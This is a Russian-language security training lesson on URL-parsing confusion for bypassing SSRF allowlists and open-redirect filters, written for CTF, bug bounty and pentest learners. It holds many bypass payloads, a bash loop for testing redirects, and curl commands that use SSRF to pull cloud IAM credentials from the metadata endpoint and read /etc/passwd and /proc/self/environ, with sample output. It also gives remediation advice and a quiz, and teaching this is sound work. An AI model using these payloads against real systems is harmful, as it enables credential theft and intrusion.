---
id: web-url-parsing
title: "URL parsing confusion и SSRF/redirect bypass"
category: web
parent: web-waf-parsing-attacks
difficulty: hard
order: 1
tags: [url-parsing, ssrf, redirect, bypass, parser]
prerequisites: [web-waf-bypass]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Расхождения в парсинге URL: @-трюки, backslash, кодирование, схема, порт — обход SSRF-allowlist и open redirect."
---

URL parsing confusion — это класс багов, возникающий из-за того, что **разные компоненты по-разному разбирают один и тот же URL**. WAF, прокси, SSRF-фильтр и HTTP-клиент бэкенда могут извлечь разные host/схему/path из строки `http://...`. Атакующий подбирает URL, который для проверки выглядит «безопасным», а для клиента указывает на внутренний ресурс. Это основа обхода SSRF-allowlist, open-redirect-фильтров и анти-CSRF-проверок Origin.

## Теория: кто как парсит URL

Упрощённая модель URL: `scheme://userinfo@host:port/path?query#fragment`. Различия возникают в:

- трактовке `@` (userinfo vs host),
- обратных слэшах `\` (браузеры нормализуют, многие библиотеки — нет),
- поддоменах/суффиксах (`.example.com.attacker.com`),
- портах и схемах (`http:` vs `http:%00`),
- Unicode/IDN-гомоглифах,
- редиректах (проверили первый URL — клиент пошёл по `Location`).

Правило: **никогда не полагайтесь на «URL выглядит правильно» — проверяйте, куда реально идёт запрос**.

## Техника 1: @-трюк (userinfo)

Всё до `@` — это userinfo, после — реальный host. Фильтр может искать `trusted.com`, а клиент пойдёт на `attacker.com`:

```text
https://trusted.com@attacker.com/
https://trusted.com%40attacker.com/
https://attacker.com#@trusted.com
https://attacker.com?@trusted.com
```

Если allowlist проверяет «содержит trusted.com» → обход. Правильная проверка — парсить host и сравнивать ровно.

## Техника 2: обратный слэш и кодирование

Браузеры трактуют `\` как `/`. Многие парсеры — нет:

```text
https://attacker.com\@trusted.com/
https://attacker.com\/trusted.com/
http://trusted.com\.attacker.com/
https://attacker.com%2f@trusted.com/
https://attacker.com%5c@trusted.com/
```

Также двойное/тройное URL-кодирование: `%252f`, `%2e%2e`. Фильтр декодирует один раз, клиент — дважды.

## Техника 3: поддомены и суффиксы

Проверка «host оканчивается на trusted.com» ломается:

```text
https://trusted.com.attacker.com/
https://attacker.com/trusted.com
https://trusted.com.attacker.com#trusted.com
https://notreallytrusted.com/
```

Проверка «начинается с trusted.com» ломается `trusted.com.attacker.com` (если DNS резолвит в attacker). Ищите, что именно проверяет фильтр.

## Техника 4: схема и порт

- `http://attacker.com:80@trusted.com` — порт перед `@`.
- `http://trusted.com:80.attacker.com` — невалидно для части парсеров.
- Смена схемы: `gopher://`, `dict://`, `file://`, `ftp://` — если клиент поддерживает, это усиливает SSRF (см. `web-ssrf-protocol-smuggling`).
- `http://127.0.0.1:80` → альтернативы: `0177.0.0.1`, `2130706433`, `0x7f000001`, `[::1]`, `127.1`.

## Техника 5: Unicode/IDN

Гомоглифы и IDN: `аttacker.com` (кириллическая `а`), `trusted。com` (идеографическая точка), `trusted.com\u0000.attacker.com`. Парсер punycode/нормализация может дать неожиданный host.

## Техника 6: редиректы

Фильтр проверяет URL, но не проверяет `Location` ответа. Если приложение следует редиректам — обход:

```text
https://trusted.com/redirect?to=http://169.254.169.254/
```

Или цепочка: `attacker.com` → 302 → `internal`.

## Разобранный пример: обход SSRF-allowlist

Цель: `GET /fetch?url=...` с allowlist «host содержит trusted.com».

Шаг 1 — проверяем базовый блок:

```bash
curl -s "https://app.example/fetch?url=http://169.254.169.254/latest/meta-data/"
# blocked
```

Шаг 2 — @-трюк:

```bash
curl -s "https://app.example/fetch?url=http://trusted.com@169.254.169.254/latest/meta-data/"
```

Шаг 3 — если сработало, вытаскиваем метаданные (роль/креды):

```bash
curl -s "https://app.example/fetch?url=http://trusted.com@169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Шаг 4 — дальше по `playbook-cloud` (IAM → бакеты → данные).

## Разобранный пример: open redirect

Цель: `/login?next=...` с проверкой «начинается с `/`».

```bash
curl -sI "https://app.example/login?next=//attacker.com"
curl -sI "https://app.example/login?next=/\attacker.com"
curl -sI "https://app.example/login?next=https:/attacker.com"
```

`//attacker.com` — protocol-relative URL, часто проходит проверку «начинается с /».

## Разобранный пример: SSRF → file://

Если клиент поддерживает `file://`, читаем локальные файлы:

```bash
curl -s "https://app.example/fetch?url=file:///etc/passwd"
curl -s "https://app.example/fetch?url=file:///proc/self/environ"
```

Требование: HTTP-клиент бэкенда умеет `file://` (curl, некоторые Java-либы).

## Как тестировать

- Составьте список вариаций URL и прогоните через уязвимый параметр (Burp Intruder, а не цикл curl).
- Используйте свой collaborator/DNS для детекта исходящих запросов.
- Сравнивайте, что вернул сервер, с тем, куда реально пошёл запрос (по коллаборатору).
- Проверяйте не только host, но и путь: `http://trusted.com@attacker.com/internal` — иногда нужен и путь.

## Инструменты

- **Burp Collaborator/`interactsh`** — детект SSRF/redirect.
- **Burp Intruder** — перебор вариаций.
- **`curl --path-as-is`** — точная отправка.
- **`ssrfmap`/`gopherus`** — эксплуатация SSRF (см. `web-ssrf-protocol-smuggling`).

## Что дальше / decision

1. Есть SSRF/redirect-параметр → проверьте `@`-трюк и `//`.
2. Обход сработал → цельтесь в metadata/внутренние сервисы.
3. Клиент поддерживает `gopher://` → Redis/MySQL (см. `web-ssrf-protocol-smuggling`).
4. Open redirect → фишинг/обход OAuth-`redirect_uri`.
5. Дальше — связать с облаком (`playbook-cloud`) и внутренней сетью.

## Частые ошибки

- **Проверять URL глазами, а не поведением.** Разные парсеры = разные host.
- **Забыть про `@`.** Самый частый обход allowlist.
- **Игнорировать обратный слэш.** Браузеры его нормализуют.
- **Не проверять редиректы.** Фильтр смотрит первый URL.
- **Считать allowlist непробиваемым.** Сравнение подстроки всегда ломается.
- **Ломать прод.** SSRF к внутренним сервисам — аккуратно.

## Полный разбор: @-трюк и SSRF allowlist bypass (с выводом)

Цель: `GET /fetch?url=...` с allowlist «host содержит trusted.com».

Шаг 1. Baseline — блокировка:

```bash
curl -s "https://app.example/fetch?url=http://169.254.169.254/latest/meta-data/"
# {"error":"url not allowed"}
```

Шаг 2. @-трюк (валидатор видит `trusted.com`, клиент идёт на `169.254.169.254`):

```bash
curl -s "https://app.example/fetch?url=http://trusted.com@169.254.169.254/latest/meta-data/"
# {"iam":"..."}   -> обход сработал
```

Шаг 3. Забираем креды роли:

```bash
curl -s "https://app.example/fetch?url=http://trusted.com@169.254.169.254/latest/meta-data/iam/security-credentials/"
# webapp-prod-role
curl -s "https://app.example/fetch?url=http://trusted.com@169.254.169.254/latest/meta-data/iam/security-credentials/webapp-prod-role"
# {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
```

Шаг 4. Проверяем креды снаружи (`aws sts get-caller-identity`) и идём по `playbook-cloud`.

Другие вариации, если `@` отфильтрован:

```bash
http://trusted.com%40169.254.169.254/
http://169.254.169.254#@trusted.com
http://169.254.169.254?@trusted.com
http://trusted.com.169.254.169.254.nip.io/
http://169.254.169.254%2f@trusted.com/
http://0xa9fea9fe/
http://[::ffff:169.254.169.254]/
```

## Reference-таблица: парсерные расхождения

| Приём | Строка | Что видит валидатор / куда идёт клиент |
|-------|--------|----------------------------------------|
| userinfo `@` | `http://trusted.com@evil/` | trusted.com / evil |
| encoded `@` | `http://trusted.com%40evil/` | trusted.com / evil |
| fragment | `http://evil#@trusted.com` | trusted.com / evil |
| backslash | `http://evil\@trusted.com/` | trusted.com / evil |
| subdomain | `http://trusted.com.evil/` | содержит trusted.com / evil |
| path | `http://evil/trusted.com` | содержит trusted.com / evil |
| scheme | `gopher://`, `file://`, `dict://` | — / локальный ресурс |
| IP-обфускация | `0177.0.0.1`, `2130706433`, `0x7f000001` | — / 127.0.0.1 |
| protocol-relative | `//evil.com` | «начинается с /» / evil |
| redirect | `http://trusted/redirect?to=internal` | trusted / internal |

## Java URL-схемы и другие неочевидные обходы

Java-приложения (и некоторые HTTP-клиенты) поддерживают нестандартные схемы:

```
file:///etc/passwd
jar:file:///path!/entry
jar:http://attacker/x.jar!/y
netdoc:///etc/passwd
mailto:x@y
```

Если клиент бэкенда — Java `URL`/`URLConnection`, `file:`/`jar:`/`netdoc:` могут читать локальные файлы и обходить allowlist по схеме. Проверяйте `url=` с этими схемами.

Другие обходы:

- **Редиректы:** `trusted.com/redirect?to=http://169.254.169.254/` — фильтр видит trusted, клиент следует на metadata.
- **DNS rebinding:** см. `web-dns-rebinding`.
- **Unicode/IDN:** `trusted。com`, `trusted.com\u0000.attacker.com`.
- **Порт:** `http://trusted.com:80@169.254.169.254/`.

## Что делать дальше / решение

1. **Найти SSRF/redirect-параметр** и подтвердить OOB.
2. **Перебрать вариации** (`@`, `#`, `\`, subdomain, IP-обфускация).
3. **Проверить схемы** (`gopher`/`file`/`jar`/`dict`).
4. **Проверить редиректы** (фильтр смотрит первый URL).
5. **Обход сработал** → metadata/внутренние сервисы → `playbook-cloud`.
6. **Оформить PoC** с точным URL и доказательством (коллаборатор/ответ).
7. **Записать** найденные креды как артефакт.

## Open redirect bypass и чек-лист

Open redirect — частый спутник URL-парсинга. Обходы фильтра «начинается с `/`» или «host = trusted»:

```
//attacker.com                 (protocol-relative)
/\attacker.com                 (браузер: ///attacker.com)
\/attacker.com
https:attacker.com             (без //)
https:/attacker.com
https://trusted.com@attacker.com
https://trusted.com.attacker.com
https://attacker.com/trusted.com
https://attacker.com#trusted.com
https://trusted.com?next=//attacker.com
https://trusted.com\/\/attacker.com
%2f%2fattacker.com
%09//attacker.com
```

Проверка:

```bash
for u in '//attacker.com' '/\attacker.com' 'https:attacker.com' 'https://trusted.com@attacker.com' 'https://trusted.com.attacker.com'; do
  echo -n "$u -> "
  curl -s -o /dev/null -w '%{redirect_url}\n' "https://app.example/login?next=$u"
done
```

Если `redirect_url` указывает на `attacker.com` — open redirect. Эскалация: обход OAuth `redirect_uri`, фишинг, увод токена сброса пароля.

## Чек-лист URL-парсинга

1. **Собрать параметры** с URL/ссылками (`url=`, `next=`, `redirect=`, `callback=`, `return=`, `image=`, `webhook=`).
2. **Подтвердить SSRF/redirect** через OOB (коллаборатор).
3. **Перебрать вариации**: `@`, `#`, `?`, `\`, `//`, кодирование, subdomain, IP-обфускация.
4. **Проверить схемы**: `gopher://`, `file://`, `dict://`, `jar://`, `netdoc://`.
5. **Проверить редиректы** (фильтр смотрит только первый URL).
6. **Проверить нормализацию** (двойное кодирование, `%2e%2e`).
7. **Сравнить парсеры**: что видит WAF/фильтр vs куда идёт HTTP-клиент.

Всегда подтверждайте поведением (куда реально ушёл запрос), а не тем, что «URL выглядит безопасно».

## Что делать дальше / решение

1. **Найти SSRF/redirect-параметр**, подтвердить OOB.
2. **Перебрать вариации URL** (Burp Intruder, не цикл curl).
3. **Проверить схемы и редиректы.**
4. **Обход сработал** → metadata/внутренние сервисы → `playbook-cloud`.
5. **Open redirect** → связать с OAuth/сбросом пароля.
6. **Оформить PoC** с точным URL и доказательством.

## Инструменты и безопасная валидация URL

**Инструменты:**

- **Burp Collaborator/`interactsh`** — детект исходящих запросов (SSRF/redirect).
- **Burp Intruder** — перебор вариаций URL.
- **`curl --path-as-is`** — точная отправка без нормализации.
- **`ssrfmap`/`gopherus`** — эксплуатация SSRF.
- **`ffuf`** — перебор параметров/путей.

**Безопасная валидация URL (для рекомендаций в отчёте):**

1. Парсить URL строгим парсером и сравнивать **нормализованный host** ровно (не подстрокой).
2. Запрещать `@` в userinfo, обратные слэши, управляющие символы.
3. Allowlist **после** декодирования и нормализации.
4. Запрещать схемы кроме `http`/`https`.
5. Резолвить host один раз и проверять IP (защита от rebinding), либо использовать egress-proxy.
6. Не следовать редиректам или проверять `Location` так же строго.
7. Блокировать внутренние диапазоны и metadata на сетевом уровне.

Ошибка «сравнивать host подстрокой» — корень большинства обходов. В отчёте показывайте конкретный обход и предлагайте строгую проверку.

## Итог по URL-парсингу

Корень обходов — расхождение парсеров: валидатор и HTTP-клиент видят разные host/схему/путь. Тестируйте поведением (`@`, `\`, `//`, кодирование, subdomain, IP-обфускация, схемы, редиректы), а не «на глаз». Защита — строгий парсинг, allowlist после нормализации, запрет лишних схем и редиректов.

## Быстрый чек-лист URL-обходов

`@`, `%40`, `#`, `\`, `//`, `%2f`, subdomain, IP-обфускация (`0177.0.0.1`, `2130706433`, `0x7f000001`, `[::1]`), схемы (`gopher`/`file`/`dict`/`jar`), редиректы. Подтверждайте поведением (коллаборатор), а не «на глаз».

## Квиз

```quiz
- question: "Почему http://allowed.com@evil.com обходит allowlist?"
  options:
    - "Это один хост"
    - "Валидатор видит allowed.com, клиент подключается к evil.com (после @)"
    - "Это TLS"
    - "Это cookie"
  answer: 1
  explanation: "Userinfo-разделитель @."
- question: "Что даёт обратный слэш в URL?"
  options:
    - "Ничего"
    - "Браузеры нормализуют \\ в /, меняя разбор хоста"
    - "Шифрование"
    - "Кеш"
  answer: 1
  explanation: "Расхождение нормализации."
- question: "Как редирект обходит SSRF-валидацию?"
  options:
    - "Ускоряет"
    - "Первый URL разрешён, но редиректит на внутренний"
    - "Шифрует"
    - "Кеширует"
  answer: 1
  explanation: "Проверяется только исходный URL."
- question: "Какая Java-схема читает файлы?"
  options:
    - "http://"
    - "jar:/netdoc:"
    - "ftp://"
    - "ws://"
  answer: 1
  explanation: "Java URL поддерживает jar/netdoc."
- question: "Что такое protocol-relative URL?"
  options:
    - "https://evil.com"
    - "//evil.com (схема наследуется)"
    - "http://"
    - "mailto:"
  answer: 1
  explanation: "Схема берётся из контекста."
```

## Где пригодится

- **CTF (Web):** обход SSRF/redirect.
- **Bug bounty:** allowlist bypass — критичный отчёт.
- **Пентест:** аудит URL-валидации.
- **Работа (AppSec):** строгий парсинг, allowlist после нормализации, запрет редиректов.
